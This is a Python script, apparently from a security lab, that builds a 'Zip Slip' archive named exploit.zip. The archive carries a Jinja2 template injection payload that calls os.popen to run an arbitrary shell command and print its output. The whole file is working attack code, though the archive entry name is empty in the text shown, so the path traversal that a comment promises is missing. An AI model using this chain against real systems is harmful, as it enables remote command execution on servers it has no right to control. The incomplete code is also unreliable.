#!/usr/bin/env python3
"""Build the Zip Slip archive."""

from pathlib import Path
import io
import zipfile


DEFAULT_TEMPLATE = """
<div class="result-box">
    <h3>EXPLOIT EXECUTION OUTPUT:</h3>
    <pre>{{{{ cycler.__init__.__globals__.os.popen("{command}").read() }}}}</pre>
</div>
"""


def build_payload(command: str = "ls") -> bytes:
    escaped_command = command.replace("\\", "\\\\").replace('"', '\\"')
    template = DEFAULT_TEMPLATE.format(command=escaped_command)

    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as bundle:
        # The traversal is intentional and belongs only to this isolated lab module.
        bundle.writestr("", template)
    return archive.getvalue()


def main() -> None:
    output_path = Path(__file__).with_name("exploit.zip")
    output_path.write_bytes(build_payload())
    print(f"[OK] Exported payload to {output_path}")


if __name__ == "__main__":
    main()
